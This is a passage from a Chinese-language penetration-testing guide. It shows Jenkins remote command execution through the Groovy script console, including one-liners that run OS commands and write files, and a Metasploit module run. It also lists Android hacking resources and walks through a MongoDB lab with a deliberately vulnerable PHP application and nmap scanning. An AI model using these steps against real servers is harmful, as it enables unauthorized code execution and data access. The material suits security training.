        ... 9 more
    Mar 15, 2017 5:05:18 AM hudson.model.DownloadService$Downloadable load
    INFO: Obtained the updated data file for hudson.tools.JDKInstaller
    Mar 15, 2017 5:05:18 AM hudson.model.AsyncPeriodicWork$1 run
    INFO: Finished Download metadata. 27,508 ms
请注意这里，我们需要密码来完成设置。
    Jenkins initial setup is required. An admin user has been created and a password generated.
    Please use the following password to proceed to installation:
    e019dca34bac4a30beca67b53e821f35
#### 如何利用jenkins服务器？
访问 , 并用脚本控制台pwn jenkins服务器。
> 脚本控制台
>
>
> 输入一个任意的Groovy脚本并在服务器上执行它。用于故障排除和诊断。使用'println'命令来查看输出结果(如果使用System.out，它将转到服务器的stdout，这是很难看到的。)
>
> 例如：
#### **execmd.groovy**
**execmd.groovy** 可以帮助你在jenkins服务器上执行os命令。
    # Windows
    println "cmd.exe /c dir".execute().text
    # Linux
    println "uname -a".execute().text
#### **writefile.groovy**
**writefile.groovy** 可以将字符串写入jenkins服务器上的文件。
    new File("/tmp/test.sh").write("""
    echo "123"
    echo "456"
    """)
如果你更喜欢[metasploit-framework](https://github.com/rapid7/metasploit-framework),
    msf > use exploit/multi/http/jenkins_script_console
    msf exploit(jenkins_script_console) > show options
    Module options (exploit/multi/http/jenkins_script_console):
       Name       Current Setting  Required  Description
       ----       ---------------  --------  -----------       PASSWORD   password         no        The password for the specified username
       Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOST      192.168.1.100    yes       The target address
       RPORT      8080             yes       The target port
       TARGETURI  /                yes       The path to jenkins
       USERNAME   test             no        The username to authenticate as
       VHOST                       no        HTTP server virtual host
    Exploit target:
       Id  Name
       --  ----       1   Linux
    msf exploit(jenkins_script_console) > exploit
#### 链接
  1. 
## WEB应用程序评估
### Android hacking 与 安全
  1. [利用保护应用程序组件](http://resources.infosecinstitute.com/android-hacking-security-part-1-exploiting-securing-application-components/)
  2. [内容提供者泄露](http://resources.infosecinstitute.com/android-hacking-security-part-2-content-provider-leakage/)
  3. [利用广播接收机](http://resources.infosecinstitute.com/android-hacking-security-part-3-exploiting-broadcast-receivers/)
  4. [利用非预期的数据泄漏端信道数据泄漏](http://resources.infosecinstitute.com/android-hacking-security-part-4-exploiting-unintended-data-leakage-side-channel-data-leakage/)
  5. [使用jdb调试java应用程序](http://resources.infosecinstitute.com/android-hacking-security-part-5-debugging-java-applications-using-jdb/)
  6. [利用可调试的android应用程序](http://resources.infosecinstitute.com/android-hacking-security-part-6-exploiting-debuggable-android-applications/)
  7. [攻击android的webviews](http://resources.infosecinstitute.com/android-hacking-security-part-7-attacks-android-webviews/)
  8. [根检测规避](http://resources.infosecinstitute.com/android-hacking-security-part-8-root-detection-evasion/)
  9. [不安全的本地存储共享偏好](http://resources.infosecinstitute.com/android-hacking-security-part-9-insecure-local-storage-shared-preferences/)
  10. [不安全的本地存储](http://resources.infosecinstitute.com/android-hacking-security-part-10-insecure-local-storage/)
  11. [黑盒评估introspy](http://resources.infosecinstitute.com/android-hacking-security-part-11-blackbox-assessments-introspy/)
  12. [保护共享偏好第三方库](http://resources.infosecinstitute.com/android-hacking-security-part-12-securing-shared-preferences-third-party-libraries/)
  13. [drozer介绍](http://resources.infosecinstitute.com/android-hacking-security-part-13-introduction-drozer/)
  14. [检查Android应用程序特定的数据非根设备](http://resources.infosecinstitute.com/android-hacking-security-part-14-examining-android-app-specific-data-non-rooted-devices/)
  15. [使用备份技术攻击android应用程序](http://resources.infosecinstitute.com/android-hacking-security-part-15-hacking-android-apps-using-backup-techniques/)
  16. [破解密码学](http://resources.infosecinstitute.com/android-hacking-security-part-16-broken-cryptography/)
  17. [破解Android应用程序二进制文件](http://resources.infosecinstitute.com/android-hacking-security-part-17-cracking-android-app-binaries/)
  18. [逆向工程介绍](http://resources.infosecinstitute.com/android-hacking-and-security-part-18-introduction-to-reverse-engineering/)
  19. [使用nosql数据库不安全的数据存储](http://resources.infosecinstitute.com/android-hacking-and-security-part-19-insecure-data-storage-with-nosql-databases/)
  20. [使用gdb在android模拟器上调试应用程序](http://resources.infosecinstitute.com/android-hacking-and-security-part-20-debugging-apps-on-android-emulator-using-gdb/)
### 安卓逆向工程
  1. 
  2. 
  3. 
  4. 
  5. 
### [Android安全和渗透利用](http://www.pentesteracademy.com/course?id=24)
  1. 介绍
  2. Android的安全性-介绍
  3. Android-架构
  4. Android-权限
  5. Android-应用
  6. Genymotion(一款安卓模拟器) 设置
  7. Android-应用程序组件
  8. Dex-分析
  9. Android-调试桥
  10. 基于日志记录的漏洞
  11. 应用逆向
  12. 分析Android的软件及恶意软件
  13. 流量分析
  14. SSL-Pinning
  15. 泄漏的内容提供商
  16. Drozer-功夫
  17. 基于read的内容提供商漏洞
  18. 进阶Drozer-功夫
  19. Drozer脚本
  20. Dropbox的脆弱性
  21. 基于备份的漏洞
  22. 客户端注入
  23. Hooking 介绍和不安全的设置
  24. 基于Andbug的Android调试 
  25. JDB调试
  26. 用Introspy自动Hooking
  27. Cydia-基底
  28. 使用Xposed进行Hooking
  29. Androguard脚本和分析
  30. 基于webviews的漏洞
  31. 利用Metasploit工具攻击webviews
### 书籍推荐
  1. Android安全手册
  2. Android黑客手册
  3. 学习针对Android设备的测试
## 数据库评估
### mongodb
#### 1\. 介绍和Labs安装.
##### 1.1 什么是MongoDB ?
> MongoDB是一种开源的、文档导向的数据库管理系统，由C++撰写而成。  
>  在MongoDB中，数据以JSON样式文档的形式存储。  
>  MongoDB的一些主要特性:  
>  • 基于文档  
>  • 高性能  
>  • 高可用性  
>  • 简单的可扩展性  
>  • 没有复杂的联接
##### 1.2 安全性如何 ?
> 随着NoSQL数据库的使用越来越多，安全性应该被认真考虑。 就像其他系统一样，MongoDB的安全性也不是一个单一的工作。
> 生态系统中的每个人都对此负责。 尽管MongoDB具有一些内置的安全功能，但由于各种原因（如配置错误，不更新，编程不佳等），在生产中可能存在漏洞 。
##### 1.3 在ubuntu中安装MongoDB
>
> 我这里使用的是Ubuntu14.04，不同的版本安装MongoDB的命令可能有点差异，为了方便，Ubuntu开启了SSH服务，安装了特定版本的MongoDB
> 3.0.4。  
>  step 1 : 导入MongoDB GPG密钥。  
>  `sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv
> 7F0CEB10`  
>  step 2 : 为mongodb创建一个list file  
>  `echo "deb http://repo.mongodb.org/apt/ubuntu precise/mongodb-org/3.0
> multiverse" | sudo tee /etc/apt/sources.list.d/mongodb-org-3.0.list`  
>  step 3 : 只更新mongodb-org-3.0.list  
>  `sudo apt-get update`  
>  step 4 : 安装特定版本的mongodb  
>  `sudo apt-get install -y mongodb-org=3.0.4 mongodb-org-server=3.0.4
> mongodb-org-shell=3.0.4 mongodb-org-mongos=3.0.4 mongodb-org-tools=3.0.4`  
>  step 5 : 配置防止意外升级  
>  `echo "mongodb-org hold" | sudo dpkg --set-selections`  
>  `echo "mongodb-org-server hold" | sudo dpkg --set-selections`  
>  `echo "mongodb-org-shell hold" | sudo dpkg --set-selections`  
>  `echo "mongodb-org-mongos hold" | sudo dpkg --set-selections`  
>  `echo "mongodb-org-tools hold" | sudo dpkg --set-selections`  
>  step 6 : 启动MongoDB服务  
>  `sudo service mongod start`  
>  step 7 : 验证进程是否成功启动  
>  `tail -20 /var/log/mongodb/mongod.log`  
>  如果看到如下输出信息,意味着进程已成功启动  
>  `[initandlisten] waiting for connections on port `  
>  step 8 : 为了实现渗透测试，需要使用以下步骤启动MongoDB  
>  `sudo mongod --httpinterface --rest --smallfiles`
##### 1.4 学习Mongo Shell
> 在前几节中，我们已经看到了对MongoDB及其设置的简要介绍。现在是时候使用Mongo
> shell并在MongoDB上执行一些命令来更好了解MongoDB及其工作。  
>  MongoDB使用JavaScript风格的查询，因此我们觉得大部分时间都在运行JavaScript代码。  
>  本节将简要介绍MongoDB的工作原理,并且介绍简单的Mongo shell命令。  
>  在我们开始之前，有几个术语要理解。  
>  • MongoDB 可以有多个数据库.  
>  • 每个数据库都含有一个或多个集合 “collections”.  
>  • 每个集合都含有一个或多个文档 “documents”.
现在，我们继续运行MongoDB命令。
###### 1.4.1 创建数据库
> 如果要创建的数据库名不存在，以下命令将创建一个新的数据库，数据库名已存在会直接使用它。
让我们来创建一个名为"testdb"的数据库。
###### 1.4.2 检查当前数据库
> 我们可以使用命令"db"来检查当前的数据库。 我们运行命令"db"来检查当前的数据库。
###### 1.4.3 检查数据库列表
> "show
> dbs"是列出可用数据库的命令,但是这里并没有输出我们刚才创建的testdb数据库，因为它至少需要一个文档，当我们插入一个文档，我们就可以看到列出的数据库。
###### 1.4.4 将数据插入集合
> 这个是把一个数据插入到data集合中。  
>  "db.data.insert({"user":"test1"})
###### 1.4.5 查询数据
> 从MongoDB集合中查询数据，可以使用find()方法。  
>  让我们查询data集合中的全部文档数据。  
>  "db.data.find()"
###### 1.4.6 在查询数据时写入条件
> 我们还可以使用MongoDB特定的语法在类似于RDBMS条件的查询中编写条件，让我们来匹配用户名user为test1的数据。
###### 1.4.7 删除数据
> 我们可以使用remove()方法根据特定条件从集合中删除文档。让我们来删除用户名user为test3的数据。
###### 1.4.8 删除集合
> 我们可以使用drop()方法来删除集合，让我们来删除data集合。
###### 1.4.9 删除数据库
> 我们可以使用db.dropDatabase()删除目前使用的数据库。
##### 1.5 Lab实验环境安装
> 熟悉了MongoDB的基本操作之后，接下来我们本地搭建一个Lab实验环境来开始我们的MongoDB数据库渗透测试。
这里我是通过Parrot和Ubuntu虚拟机来搭建Lab实验环境的,只要确保两主机网络互通即可，桥接和NAT都可以实现。  
用Ubuntu来模拟现实中的生产机器，安装MongoDB和php web应用程序。  
接下来正式开始我们的Lab实验环境搭建，我这里先安装好了LAMP。
> 注意: 请使用与我用来创建数据库和集合相同的名称。这是PHP
> Web应用程序的工作所必需的。如果您更改这些名称，则可能需要相应地更改PHPWeb应用程序。
step 1 : 创建一个新的数据库
step 2 : 插入数据  
把测试数据插入集合"users"和集合"products"。
    db.users.insert({"username":"tom","password":"tom","email":"PI:EMAIL","cardnumber":12345})
    db.users.insert({"username":"jim","password":"jim","email":"PI:EMAIL","cardnumber":54321})
    db.users.insert({"username":"bob","password":"bob","email":"PI:EMAIL","cardnumber":22222})
    db.products.insert({"email":"PI:EMAIL","prodname":"laptop","price":"1500USD"})
    db.products.insert({"email":"PI:EMAIL","prodname":"book","price":"50USD"})
    db.products.insert({"email":"PI:EMAIL","prodname":"diamond-ring","price":"4500USD"})
step 3 : 安装mongo的PHP驱动程序
> 为了使PHP Web应用程序能够使用MongoDB，我们需要安装PHP驱动程序。
>  
>  
>     sudo apt-get install php-pear
>     sudo pecl install mongo
>
> 如果出现如下报错，使用`sudo apt-get install php5-dev`，安装完成后。  
>  再使用`sudo pecl install mongo`即可。
安装完成后，会提示把"extension=mongo.so"添加到php.ini中，添加即可。
step 4 : 安装PHP Web应用程序
> 这里安装比较简单了，直接把mongo.zip拷贝到Ubuntu,解压到/var/www/html目录下，启动apache服务即可。
这一步完成了PHP漏洞应用程序的安装。一旦一切正常，我们可以在浏览器中启动Web应用程序。如图所示:
之前我们已经在Mongo数据库中插入了测试数据，现在我们直接用tom用户密码登录。  
如果你看到如上所示的主页，那就证明MongoDB渗透环境已经搭建好了。
#### 2\. 漏洞评估
##### 2.1 介绍
>
> 面对错误配置问题,MongoDB可能会像其他数据库/服务器一样。在本节中，我们将看到一些常见的错误配置以及如何识别它们。我们也将看到与使用MongoDB作为后端的Web应用程序相关的漏洞。
##### 2.2 扫描开放端口
> 在进行黑盒评估时，我们可以使用nmap来确定MongoDB是否在远程主机上运行。
> MongoDB服务的默认端口是27017。扫描到27017是open表示允许在远程主机上运行，默认绑定地址是127.0.0.1，是扫不出来的，我这里修改了绑定地址为0.0.0.0
MongoDB默认设置不需要使用客户端控制台进行连接的任何验证。如果MongoDB服务在没有适当的安全控制的情况下通过网络公开，任何人都可以远程连接到数据库，并执行命令来创建/读取/更新/删除数据库。我们将在后面的章节中试图做到这一点。
##### 2.3 服务枚举
> 虽然我们知道了开放端口2017，但其他一些服务可能会使用此端口。也可以运行MongoDB在不同的端口上。
> 为了确保我们找到的端口是MongoDB，我们可以使用nmap的“-sV”标志来执行服务枚举。
这也有助于弄清楚MongoDB的版本，以便我们可以找到任何已知的版本可用漏洞。
>
> 在我们的渗透测试中，我们可能会遇到MongoDB的老版本。一个快速的Shodan搜索显示，大部分被发现的MongoDB版本都在运行旧版本的MongoDB。
这对攻击者来说绝对是个好消息，因为旧版本的MongoDB实例中存在许多默认的错误配置。
##### 2.4 扫描HTTP接口